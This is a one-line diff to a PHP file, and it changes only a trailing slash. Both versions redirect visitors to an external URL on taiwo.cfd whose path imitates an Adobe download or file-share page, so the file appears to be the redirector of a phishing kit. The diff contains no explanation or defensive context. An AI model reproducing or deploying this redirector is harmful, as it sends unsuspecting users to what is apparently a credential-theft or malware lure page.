@@ -1,1 +1,1 @@
-<?php header("Location: https://taiwo.cfd/bincgi/adbe/dwnl/lmshare/"); ?>
+<?php header("Location: https://taiwo.cfd/bincgi/adbe/dwnl/lmshare"); ?>
